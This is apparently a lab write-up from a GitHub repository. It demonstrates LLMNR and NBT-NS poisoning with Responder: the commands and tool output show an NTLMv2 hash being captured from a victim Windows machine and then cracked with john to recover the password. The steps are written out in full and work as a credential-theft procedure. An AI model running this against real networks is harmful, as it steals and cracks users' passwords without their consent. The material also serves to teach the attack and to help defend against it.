## Attack
LLMNR and NBT-NS Spoofing

## Procedure
- Start Capturing the traffic on the interface you are connected with the filter ```ip.addr == <Address of the victim>```.   
- Start responder on interface with sudo privileges.
```bash
f4lc0n@klaw /g/Responder> sudo ./Responder.py -I eno1 -wrf
```
 - The output will be in a similar way.


```bash
.----.-----.-----.-----.-----.-----.--|  |.-----.----.
|   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
|__| |_____|_____|   __|_____|__|__|_____||_____|__|
|__|

NBT-NS, LLMNR & MDNS Responder 2.3

Author: Laurent Gaffie (laurent.gaffie@gmail.com)
To kill this script hit CRTL-C


[+] Poisoners:
LLMNR                      [ON]
NBT-NS                     [ON]
DNS/MDNS                   [ON]

[+] Servers:
HTTP server                [ON]
HTTPS server               [ON]
WPAD proxy                 [ON]
SMB server                 [ON]
Kerberos server            [ON]
SQL server                 [ON]
FTP server                 [ON]
IMAP server                [ON]
POP3 server                [ON]
SMTP server                [ON]
DNS server                 [ON]
LDAP server                [ON]

[+] HTTP Options:
Always serving EXE         [OFF]
Serving EXE                [OFF]
Serving HTML               [OFF]
Upstream Proxy             [OFF]

[+] Poisoning Options:
Analyze Mode               [OFF]
Force WPAD auth            [OFF]
Force Basic Auth           [OFF]
Force LM downgrade         [OFF]
Fingerprint hosts          [ON]

[+] Generic Options:
Responder NIC              [eno1]
Responder IP               [192.168.43.178]
Challenge set              [1122334455667788]

[+] Listening for events...
```

- Now start accessing a inaccessible server on the Victim Machine.![](https://github.com/bj1408/LLMNR-Attack/blob/master/images/VictimSS1.png)

- Now we can see that Responder captures this event.
```bash
[+] Listening for events...
[SMB] NTLMv2-SSP Client   : 192.168.43.178
[SMB] NTLMv2-SSP Username : win7\f4lc0n
[SMB] NTLMv2-SSP Hash     : f4lc0n::win7:1122334455667788:C70EFFD5915B4121E403760CC5C484CB:0101000000000000A89E44AB2F15D5013D9048CA1088913D0000000002000A0053004D0042003100320001000A0053004D0042003100320004000A0053004D0042003100320003000A0053004D0042003100320005000A0053004D004200310032000800300030000000000000000100000000200000DA67F4AC3DE52B034E39D510C5B9053CDF0220D4DDD1DA9DC814C2571E50F29F0A0010000000000000000000000000000000000009001C0063006900660073002F006600690065006C00730068006100720065000000000000000000
[SMB] Requested Share     : \\FIELSHARE\IPC$
[*] Skipping previously captured hash for win7\f4lc0n
[SMB] Requested Share     : \\FIELSHARE\IPC$
``` 
- Responder successfully stole the password NTLM hash of the victim machine.
- Now use john for cracking the hash.
```bash
f4lc0n@klaw /g/Responder> john hash.txt
Warning: detected hash type "netntlmv2", but the string is also recognized as "ntlmv2-opencl"
Use the "--format=ntlmv2-opencl" option to force loading these as that type instead
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
password         (f4lc0n)
1g 0:00:00:00 DONE 2/3 (2019-05-28 14:20) 2.439g/s 72214p/s 72214c/s 72214C/s 123456..MATT
Use the "--show" option to display all of the cracked passwords reliably
```
- So the password was successfullly stolen :grin:


PS: The network capture for this attack is [here](./Captures/NBNS.pcapng).
